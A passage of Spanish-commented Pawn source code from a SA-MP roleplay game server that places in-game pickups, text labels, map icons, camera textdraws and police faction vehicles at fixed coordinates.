		CreateDynamic3DTextLabel("Para entrar use {868FD9} Y", 0xFFFFFFFF, fabricas[i][f@entradasal][0], fabricas[i][f@entradasal][1], fabricas[i][f@entradasal][2], 24.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);
		fabricas[i][f@label] = CreateDynamic3DTextLabel("Use{868FD9} /conquistar\n{ffffff}Propietario: {ff0000}Nadie", 0xFFFFFFFF, fabricas[i][f@conq][0], fabricas[i][f@conq][1], fabricas[i][f@conq][2], 24.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0);
		CreateDynamicMapIcon(fabricas[i][f@conq][0], fabricas[i][f@conq][1], fabricas[i][f@conq][2], 19, 0, 0, MAPICON_LOCAL);
	}
	
	//Comando /gob para gobierno
	CreateDynamicPickup(1239, 1, 357.3634, 113.6318, 1025.2617);
	CreateDynamic3DTextLabel("Comando{868FD9} /gob", 0xFFFFFFFF, 357.3634, 113.6318, 1025.2617, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 3);
	//FBI [FACCION]
	CreateDynamicPickup(1239, 1, 1219.2152,-1811.7039,16.5938); // Entrada FBI
	CreateDynamicPickup(1239, 1, 228.7184, 153.5194, 1003.0234); // /AP Y /CP FBI Informativo
	CreateDynamicPickup(1239, 1, 208.0704, 142.1360, 1003.0234); // Garage y Helipuerto
	CreateDynamicPickup(1239, 1, 1241.6906,-1781.8174,33.6510); // Helipuerto a la Central
	//LSPD [PRISION]
	CreateDynamicPickup(1239, 1, 2046.4567, -2075.2861, 13.6079); // Comando /arrestar [PRISION]
	CreateDynamic3DTextLabel("LSPD -{868FD9} Para arrestar utilizar\n{FFFFFF}/arrestar", 0xFFFFFFFF, 2046.4567, -2075.2861, 13.6079, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Entrada Pigpen
	CreateDynamicPickup(1239, 1, 2421.5698, -1219.2428, 25.5615); // Entrada iglesia
	CreateDynamic3DTextLabel("Club - {FC7F75}Pigpen Strip Club\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2421.5698, -1219.2428, 25.5615, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Entrada Resto La Dama [Restaurante]
	CreateDynamicPickup(1239, 1, 2633.0945, -1405.2313, 30.4524);
 	CreateDynamic3DTextLabel("Bar - {FC7F75}Restaurante La Dama\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2633.0945, -1405.2313, 30.4524, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Entrada Middleton [BAR]
	CreateDynamicPickup(1239, 1, 1555.5348, -1199.9865, 20.0236);
 	CreateDynamic3DTextLabel("Bar - {FC7F75}Middleton Social Club\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1555.5348, -1199.9865, 20.0236, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Entrada Iglesia [MAPA]
	CreateDynamicPickup(1239, 1, 2233.9846, -1333.1912, 23.9815); // Entrada a la Iglesia
 	CreateDynamic3DTextLabel("Iglesia - {FC7F75}Los Santos\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2233.9846, -1333.1912, 23.9815, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Hospital [Fort Carson]
	CreateDynamicPickup(1239,1,-320.2980,1048.2344,20.3403); // Entrada del Hospital
 	CreateDynamic3DTextLabel("Fort Carson -{FC7F75}Hospital General\n{FFFFFF}Pulsa Y", 0xFFFFFFFF,-320.2980,1048.2344,20.3403,8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239,1,-204.3939,-1735.3229,675.7687); // Salida Hospital
	CreateDynamic3DTextLabel("Salida del Hospital General\n{FC7F75}Pulse Y", 0xFFFFFFFF,-204.3939,-1735.3229,675.7687,5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Hospital [SAMUR]
	CreateDynamicPickup(1239, 1, -2652.1270, 504.4646, 48.0835); // Duty, Radio y Equipo
	CreateDynamic3DTextLabel("Para Equiparce\n{FC7F75}/duty /radio /equipo", 0xFFFFFFFF, -2652.1270, 504.4646, 48.0835, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, -2659.7708, 506.9668, 48.0847); // Comando /cseguro
 	CreateDynamic3DTextLabel("Consigue tu seguro médico por $1000!\n{FC7F75}/cseguro", 0xFFFFFFFF, -2659.7708, 506.9668, 48.0847, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 1172.8470, -1323.1869, 15.3999); // Entrada del Hospital
 	CreateDynamic3DTextLabel("Gobierno -{FC7F75}Hospital General\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1172.8470, -1323.1869, 15.3999, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, -2647.8711, 539.6345, 48.0835); // Salida Hospital
	CreateDynamic3DTextLabel("Salida del Hospital General\n{FC7F75}Pulse Y", 0xFFFFFFFF, -2647.8711, 539.6345, 48.0835, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, -2662.2495, 537.6510, 48.0843, 0); // Elevator LS
	CreateDynamic3DTextLabel("Elevador de SAMUR\n{FC7F75}Pulse Y", 0xFFFFFFFF, -2662.2495, 537.6510, 48.0843, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 1161.3854, -1330.1027, 31.4942); // Ascensor terraza
	CreateDynamic3DTextLabel("Acceso Hospital General\n{FC7F75}Pulse Y", 0xFFFFFFFF, 1161.3854, -1330.1027, 31.4942, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//LSPD [COMISARIA]
	CreateDynamic3DTextLabel("Gobierno - {868FD9}Comisaría\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1555.2174, -1675.6044, 16.1953, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 1555.2174, -1675.6044, 16.1953); // Exterior Comisaria
	CreateDynamicPickup(1239, 1, 786.1667, -360.7837, 994.2100); // Celdas
	CreateDynamic3DTextLabel("Para abrir/cerrar\n{868FD9}/ap y /cp", 0xFFFFFFFF, 786.1667, -360.7837, 994.2100, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamic3DTextLabel("Gobierno - {868FD9}Deposito LSPD\n{AA3333}Acceso Restringido", 0xFFFFFFFF, 2422.0039, -2077.8850, 13.5538, 12.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 2422.0039, -2077.8850, 13.5538); // Deposito
	//Labels de Inicio ZZ [IMPORTANTES]
	CreateDynamicPickup(1239, 1, 1713.2515, -1860.7002, 13.5784); // DNI Inicio
	CreateDynamic3DTextLabel("Gobierno -{868FD9}Registro Ciudadano", 0xFFFFFFFF, 1713.2515, -1860.7002, 13.5784, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 1710.8884, -1888.7478, 13.5676); // Duda Inicio
 	CreateDynamic3DTextLabel("ZonaZero:\nBienvenido!\n{CE726E}/duda", 0xFFFFFFFF, 1710.8884, -1888.7478, 13.5676, 40.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//ENTRADA/SALIDA Mineria [TRABAJO]
	CreateDynamic3DTextLabel("Privado - {E6DE48}Mina\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2553.6379, -876.1029, 88.6428, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 2553.6379, -876.1029, 88.6428);//Entrada
	CreateDynamic3DTextLabel("Privado - {E6DE48}Salida Mina\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2558.5769, -876.2702, 43.9538, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 2558.5769, -876.2702, 43.9538);//Salida
	
	//Localizador
   	CreateDynamicPickup(1239, 1, 2111.7705, -1910.9108, 13.5681);
	CreateDynamic3DTextLabel("{CE726E}Utiliza /localizar\n{ffffff}para encontrar tu vehiculo\n{ffffff}Costo: {008000}1200$", -1, 2111.7705, -1910.9108, 13.5681, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Ayuntamiento
	CreateDynamicPickup(1239, 1, 1481.0374, -1772.3131, 18.7958);
	CreateDynamic3DTextLabel("Gobierno -{FFFF00}Municipalidad\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1481.0374, -1772.3131, 18.7958, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Materiales [FABRICA]
	CreateDynamicPickup(1242, 1, 122.8424, -294.3255, 1.5781);
	CreateDynamic3DTextLabel("Venta de materiales.\n4USD\n{CE726E}/cmateriales", -1, 122.8424, -294.3255, 1.5781, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//
	CreateDynamicPickup(1242, 1, 305.3573, -141.8143, 1004.0625);
	CreateDynamic3DTextLabel("Mejorar su habilidad de disparo.\n{CE726E}/practicar", -1, 305.3573, -141.8143, 1004.0625, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, -1, -1, 7);
	//Trabajo Minero [COSAS PARKA]
	CreateDynamic3DTextLabel("Use Y [Salir]", 0xFFFFFFFF, trabMinero[0][minPos][0], trabMinero[0][minPos][1], trabMinero[0][minPos][1], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, -1, -1, -1);
    CreateDynamic3DTextLabel("Use Y [Entrar]", 0xFFFFFFFF, trabMinero[1][minPos][0], trabMinero[1][minPos][1], trabMinero[1][minPos][1], 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, -1, -1, -1);
	//Cajeros [PARKA]
	CreateDynamic3DTextLabel("Banco LS\nGobierno -{868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 1295.1533, -994.0756, 38.3935, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
	CreateDynamic3DTextLabel("Gobierno - {868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 1186.9143, -1373.8412, 13.5624, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
    CreateDynamic3DTextLabel("Gobierno - {868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 2184.0383, -1142.7377, 24.4977, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
    CreateDynamic3DTextLabel("Gobierno - {868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 2852.9241, -1497.3539, 10.9075, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
    CreateDynamic3DTextLabel("Gobierno - {868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 1700.0923, -1871.0542, 13.5702, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
    CreateDynamic3DTextLabel("Gobierno - {868FD9}Para realizar operaciones bancarias \n{FFFFFF}/cajero", 0xFFFFFFFF, 2404.8374, -1935.0928, 13.5538, 4.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);///
    CreateDynamicPickup(1239, 1, 1295.1533, -994.0756, 38.3935);//Pickup Banco
    //Centro de Licencias
	CreateDynamic3DTextLabel("Privado - {E6DE48}Centro de Licencias\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 2045.5239, -1907.7998, 13.5469, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, 2045.5239, -1907.7998, 13.5469);
	//Pabello de Boxeo [UNITY]
	CreateDynamicPickup(1242, 1, 1775.0223, -1806.0796, 13.5285);
	CreateDynamic3DTextLabel("Pabellón de{E6DE48} Box!", 0xFFFFFFFF, 1775.0223, -1806.0796, 13.5285, 25.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Anuncios [CABINA]
 	CreateDynamic3DTextLabel("CNN -{868FD9} Centro de anuncios\n{FFFFFF}/ad", 0xFFFFFFFF, 1088.3285, -1379.8683, 13.8077, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Venta de Hotdog [PUESTO]
	CreateDynamic3DTextLabel("Venta{FFFFFF} de Hotdog!\n/comprarhotdog", COLOR_ROJO, 1589.6941, -1288.7108, 17.5133, 6.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//FBI [FACCION]
 	CreateDynamic3DTextLabel("Gobierno -{868FD9} Departamento del FBI\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1219.2152,-1811.7039,16.5938, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
 	CreateDynamic3DTextLabel("Gobierno -{868FD9} Departamento del FBI\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 1241.6906,-1781.8174,33.6510, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);// Helipuerto
	CreateDynamic3DTextLabel("Para abrir/cerrar\n{868FD9}/ap y /cp", 0xFFFFFFFF, 228.7184, 153.5194, 1003.0234, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 3);
	CreateDynamic3DTextLabel("Para Equiparce\n{868FD9}/duty /radio /equipo", 0xFFFFFFFF, 222.9707, 185.5289, 1003.0313, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 3);
	CreateDynamic3DTextLabel("Ascensor\n{868FD9}Pulsa Y", 0xFFFFFFFF, 208.0704, 142.1360, 1003.0234, 2.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 3);
	//Florista [PUESTO]
	CreateDynamic3DTextLabel("Floristeria\nUtiliza /comprarflores", 0xB900B9FF, 1416.3882, -1718.3469, 13.5469, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	//Salida de Paintballs [NEGOCIO]
	CreateDynamic3DTextLabel("Salida\nUtiliza /salirpaintball", 0xF4BA0BFF, -1464.7714, 1555.9248, 1052.5313, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 14);
	CreateDynamicPickup(1242, 1, -1464.7714, 1555.9248, 1052.5313);
	CreateDynamic3DTextLabel("Salida\nUtiliza /salirpaintball", 0xF4BA0BFF, -977.8622, 1053.0814, 1344.9912, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 10);
	CreateDynamicPickup(1242, 1, -977.8622, 1053.0814, 1344.9912);
	CreateDynamic3DTextLabel("Salida\nUtiliza /salirpaintball", 0xF4BA0BFF, -1128.6946, 1066.2456, 1345.7439, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 10);
	CreateDynamicPickup(1242, 1, -1128.6946, 1066.2456, 1345.7439);
	CreateDynamic3DTextLabel("Salida\nUtiliza /salirpaintball", 0xF4BA0BFF, 1947.2084, 1653.8584, -4.6563, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1242, 1, 1947.2084, 1653.8584, -4.6563);
	//CNN [FACCION]
	CreateDynamic3DTextLabel("Privado -{8AC56A} Oficina LSTV\n{FFFFFF}Pulsa Y", 0xFFFFFFFF, 759.8471, -1358.7413, 13.9899, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1242, 1, 759.8471, -1358.7413, 13.9899);
	//Guias Publicas [MAPAS]
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1181.4065, -1318.3972, 13.6281, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Hospital
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 772.0750, -1327.3168, 13.5469, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//CNN
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1813.9435, -1901.8436, 13.5730, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Unity
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1839.1881, -1421.8048, 13.5625, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Skate Park
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1193.3491, -1156.8507, 23.8864, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Avenida Casino
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 456.6184, -1493.9646, 31.0939, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Binco Caro
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 2089.0627, -1823.5455, 13.5469, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Pizza
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1718.7406, -1865.7048, 13.5723, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Unity Respawn
	CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1451.2942, -1026.9141, 23.8281, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Ex-Banco
    CreateDynamic3DTextLabel("Guía Pública de la ciudad!\n{868FD9}/mapa", -1, 1271.5137, -994.5891, 35.6477, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);	//Nuevo Banco
	//Iconos del Minimapa
	CreateDynamicMapIcon(1185.0560, -1323.9019, 13.5730, 22, 0, 0, 0); // Hospital
	CreateDynamicMapIcon(2132.3005, -2280.6406, 14.7769, 27, 0, 0, 0); // CarPoint
	CreateDynamicMapIcon(1547.4792, -1675.3093, 13.5541, 30, 0, 0, 0); // LSPD
	CreateDynamicMapIcon(1368.7128, -1279.8639, 13.5541, 18, 0, 0, 0); // Ammunation
	CreateDynamicMapIcon(2266.3047, -1666.6727, 15.3930, 45, 0, 0, 0); // Binco
	CreateDynamicMapIcon(456.8236, -1501.6539, 31.0389, 45, 0, 0, 0);  // Binco
    CreateDynamicMapIcon(2229.5786, -1721.5316, 13.5638, 54, 0, 0, 0); // GYM
    CreateDynamicMapIcon(1797.5867, -1578.8649, 14.0855, 23, 0, 0, 0); // Club VIP
    CreateDynamicMapIcon(2045.8497, -2084.1501, 13.5679, 30, 0, 0, 0); // Prision Federal
    CreateDynamicMapIcon(1290.9004, -995.0139, 38.3527, 52, 0, 0, 0); // Banco
    CreateDynamicMapIcon(1665.8531, -1885.8773, 13.5469, 55, 0, 0, 0); // Renta de autos
    CreateDynamicMapIcon(549.4012, -1291.3341, 17.2482, 55, 0, 0, 0);  // Conse Grotti
    CreateDynamicMapIcon(1128.8052, -924.7662, 43.3906, 55, 0, 0, 0);  // Conse Media
    CreateDynamicMapIcon(2131.3132, -1147.1307, 24.5072, 55, 0, 0, 0); // Conse Jefferson
    CreateDynamicMapIcon(-320.2980,1048.2344,20.3403, 22, 0, 0, 0); // Hospital Fort Carson

	// ==================      TextDrawX       ================ //

    respawntime = TextDrawCreate(311.000000, 392.000000, "Respawn de coches sin uso en:");
	TextDrawAlignment(respawntime, 2);
	TextDrawBackgroundColor(respawntime, 255);
	TextDrawFont(respawntime, 3);
	TextDrawLetterSize(respawntime, 0.500000, 1.600000);
	TextDrawColor(respawntime, -1);
	TextDrawSetOutline(respawntime, 0);
	TextDrawSetProportional(respawntime, 0);
	TextDrawSetShadow(respawntime, 2);
	TextDrawUseBox(respawntime, 1);
	TextDrawBoxColor(respawntime, 102);
	TextDrawTextSize(respawntime, 383.000000, 249.000000);

	SunGlasses = TextDrawCreate(0.0, 0.0, "_");
 	TextDrawFont(SunGlasses, 1);
  	TextDrawLetterSize(SunGlasses, 0.0, 50.0);
   	TextDrawUseBox(SunGlasses, true);
   	TextDrawColor(SunGlasses, 0);
   	
	// Textdraw camaras de seguridad
	TVCAM_Background=TextDrawCreate(0, 0, "LD_DUAL:backgnd");
	TextDrawFont(TVCAM_Background, 4);
	TextDrawColor(TVCAM_Background, 0xFFFFFFFF);
	TextDrawTextSize(TVCAM_Background, 640, 480);
	
	TVCAM_CornerTopLeft=TextDrawCreate(0, 0, "LD_DUAL:tvcorn");
	TextDrawFont(TVCAM_CornerTopLeft, 4);
	TextDrawColor(TVCAM_CornerTopLeft, 0xFFFFFFFF);
	TextDrawTextSize(TVCAM_CornerTopLeft, 320, 240);

	TVCAM_CornerTopRight=TextDrawCreate(640, 0, "LD_DUAL:tvcorn");
	TextDrawFont(TVCAM_CornerTopRight, 4);
	TextDrawColor(TVCAM_CornerTopRight, 0xFFFFFFFF);
	TextDrawTextSize(TVCAM_CornerTopRight, -320, 240);

	TVCAM_CornerBottomLeft=TextDrawCreate(0, 450, "LD_DUAL:tvcorn");
	TextDrawFont(TVCAM_CornerBottomLeft, 4);
	TextDrawColor(TVCAM_CornerBottomLeft, 0xFFFFFFFF);
	TextDrawTextSize(TVCAM_CornerBottomLeft, 320, -240);

	TVCAM_CornerBottomRight=TextDrawCreate(640, 450, "LD_DUAL:tvcorn");
	TextDrawFont(TVCAM_CornerBottomRight, 4);
	TextDrawColor(TVCAM_CornerBottomRight, 0xFFFFFFFF);
	TextDrawTextSize(TVCAM_CornerBottomRight, -320, -250);

	TextdrawUp = TextDrawCreate(320.000000, 350.000000, "ld_beat:up");
	TextDrawBackgroundColor(TextdrawUp, 255);
	TextDrawFont(TextdrawUp, 4);
	TextDrawLetterSize(TextdrawUp, 0.500000, 1.000000);
	TextDrawColor(TextdrawUp, -1);
	TextDrawSetOutline(TextdrawUp, 0);
	TextDrawSetProportional(TextdrawUp, 1);
	TextDrawSetShadow(TextdrawUp, 1);
	TextDrawUseBox(TextdrawUp, 1);
	TextDrawBoxColor(TextdrawUp, 255);
	TextDrawTextSize(TextdrawUp, 31.000000, 31.000000);

	TextdrawDown = TextDrawCreate(320.000000, 410.000000, "ld_beat:down");
	TextDrawBackgroundColor(TextdrawDown, 255);
	TextDrawFont(TextdrawDown, 4);
	TextDrawLetterSize(TextdrawDown, 0.500000, 1.000000);
	TextDrawColor(TextdrawDown, -1);
	TextDrawSetOutline(TextdrawDown, 0);
	TextDrawSetProportional(TextdrawDown, 1);
	TextDrawSetShadow(TextdrawDown, 1);
	TextDrawUseBox(TextdrawDown, 1);
	TextDrawBoxColor(TextdrawDown, 255);
	TextDrawTextSize(TextdrawDown, 31.000000, 31.000000);

	TextdrawRight = TextDrawCreate(350.000000, 380.000000, "ld_beat:right");
	TextDrawBackgroundColor(TextdrawRight, 255);
	TextDrawFont(TextdrawRight, 4);
	TextDrawLetterSize(TextdrawRight, 0.500000, 1.000000);
	TextDrawColor(TextdrawRight, -1);
	TextDrawSetOutline(TextdrawRight, 0);
	TextDrawSetProportional(TextdrawRight, 1);
	TextDrawSetShadow(TextdrawRight, 1);
	TextDrawUseBox(TextdrawRight, 1);
	TextDrawBoxColor(TextdrawRight, 255);
	TextDrawTextSize(TextdrawRight, 31.000000, 31.000000);

	TextdrawLeft = TextDrawCreate(290.000000, 380.000000, "ld_beat:left");
	TextDrawBackgroundColor(TextdrawLeft, 255);
	TextDrawFont(TextdrawLeft, 4);
	TextDrawLetterSize(TextdrawLeft, 0.500000, 1.000000);
	TextDrawColor(TextdrawLeft, -1);
	TextDrawSetOutline(TextdrawLeft, 0);
	TextDrawSetProportional(TextdrawLeft, 1);
	TextDrawSetShadow(TextdrawLeft, 1);
	TextDrawUseBox(TextdrawLeft, 1);
	TextDrawBoxColor(TextdrawLeft, 255);
	TextDrawTextSize(TextdrawLeft, 31.000000, 31.000000);

	TextdrawFinish = TextDrawCreate(320.000000, 380.000000, "ld_beat:cross");
	TextDrawAlignment(TextdrawFinish, 2);
	TextDrawBackgroundColor(TextdrawFinish, 255);
	TextDrawFont(TextdrawFinish, 4);
	TextDrawLetterSize(TextdrawFinish, 0.500000, 1.000000);
	TextDrawColor(TextdrawFinish, -1);
	TextDrawSetOutline(TextdrawFinish, 1);
	TextDrawSetProportional(TextdrawFinish, 1);
	TextDrawUseBox(TextdrawFinish, 1);
	TextDrawBoxColor(TextdrawFinish, 255);
	TextDrawTextSize(TextdrawFinish, 31.000000, 31.000000);

	TextDrawSetSelectable(TextdrawUp, 1);
	TextDrawSetSelectable(TextdrawDown, 1);
	TextDrawSetSelectable(TextdrawLeft, 1);
	TextDrawSetSelectable(TextdrawRight, 1);
	TextDrawSetSelectable(TextdrawFinish, 1);
	// -====[ Vehiculos De Venta, Se puede extender]====- //
	CargarAutos();
	CargarAutosFacc();
	for(new i;i<300;i++){
		AddPlayerClass(i, 0.0, 0.0, 0.0, 0.0, 0, 0, 0, 0, 0, 0);
	}
	// -====[ Vehiculos Del Servidor, Se puede extender]====- //
	CochesPolicia[0] = AddStaticVehicleAnt(596, 1601.9473, -1696.1240, 5.6107, 89.0810, 0, 1, VEHICULO_SPAWN);			// Patrulla
	CochesPolicia[1] = AddStaticVehicleAnt(596, 1602.1748, -1691.9042, 5.6110, 88.4362, 0, 1, VEHICULO_SPAWN);        // Patrulla
	CochesPolicia[2] = AddStaticVehicleAnt(596, 1602.0411, -1700.2920, 5.6110, 88.6648, 0, 1, VEHICULO_SPAWN);        // Patrulla
	CochesPolicia[3] = AddStaticVehicleAnt(596, 1601.8983, -1704.0681, 5.6115, 89.3552, 0, 1, VEHICULO_SPAWN);        // Patrulla
	CochesPolicia[4] = AddStaticVehicleAnt(596, 1587.3389, -1710.4362, 5.6118, 1.0410, 0, 1, VEHICULO_SPAWN);         // Patrulla
	CochesPolicia[5] = AddStaticVehicleAnt(596, 1583.4728, -1710.5020, 5.6120, 359.4709, 0, 1, VEHICULO_SPAWN);       // Patrulla
    CochesPolicia[6] = AddStaticVehicleAnt(402, 1545.2308, -1680.1783, 5.7223, 89.2245, 0, 0, VEHICULO_SPAWN); SetVehicleAttachedObject(CochesPolicia[6], 0, 19419, 0.0, -0.3, 0.8, 0.000000, 0.000000, 0.000000);
	CochesPolicia[7] = AddStaticVehicleAnt(411, 1544.4467, -1676.0834, 5.6177, 89.6164, 0, 0, VEHICULO_SPAWN); SetVehicleAttachedObject(CochesPolicia[7], 0, 19419, 0.0, -0.2, 0.7, 0.000000, 0.000000, 0.000000);
	CochesPolicia[8] = AddStaticVehicleAnt(430, 635.1070, -2006.1445, -0.1934, 354.5684, -1, -1, VEHICULO_SPAWN);    // Predator
	CochesPolicia[9] = AddStaticVehicleAnt(599, 1570.1743, -1710.9041, 6.0789, 0.5127, 0, 1, VEHICULO_SPAWN);        // Ranger
	CochesPolicia[10] = AddStaticVehicleAnt(599, 1574.3672, -1710.9801, 6.0787, 0.3933, 0, 1, VEHICULO_SPAWN);       // Ranger
	CochesPolicia[11] = AddStaticVehicleAnt(525, 2437.7898, -2077.6123, 13.4239, 180.6872, 255, 103, VEHICULO_SPAWN); // Grua 1
	CochesPolicia[12] = AddStaticVehicleAnt(525, 2448.0420, -2077.7617, 13.4239, 180.9981, 255, 103, VEHICULO_SPAWN); // Grua 2
	CochesPolicia[13] = AddStaticVehicleAnt(523, 1583.7402, -1668.5023, 5.4657, 88.7599, 0, 1, VEHICULO_SPAWN);      // HPV 1000
	CochesPolicia[14] = AddStaticVehicleAnt(523, 1583.7308, -1671.5286, 5.4637, 87.6115, 0, 1, VEHICULO_SPAWN);      // HPV 1000
	CochesPolicia[15] = AddStaticVehicleAnt(523, 1583.8281, -1674.2369, 5.4653, 89.9781, 0, 1, VEHICULO_SPAWN);      // HPV 1000
	CochesPolicia[16] = AddStaticVehicleAnt(427, 1538.5195, -1645.3208, 6.0224, 178.7787, 0, 1, VEHICULO_SPAWN);     // Enforcer
	CochesPolicia[17] = AddStaticVehicleAnt(427, 1534.8190, -1645.2932, 6.0222, 178.9228, 0, 1, VEHICULO_SPAWN);     // Enforcer
	CochesPolicia[18] = AddStaticVehicleAnt(601, 1526.7194, -1644.9723, 5.6494, 179.5714, 0, 1, VEHICULO_SPAWN);     // SWAT Van
	CochesPolicia[19] = AddStaticVehicleAnt(497, 1564.4968, -1653.5677, 28.5751, 271.6026, 0, 1, VEHICULO_SPAWN);    // Maverick LSPD [HELICOPTERO]
	CochesPolicia[20] = AddStaticVehicleAnt(430, 661.1824, -2006.5925, -0.5202, 38.5216, -1, -1, VEHICULO_SPAWN);    // Predator
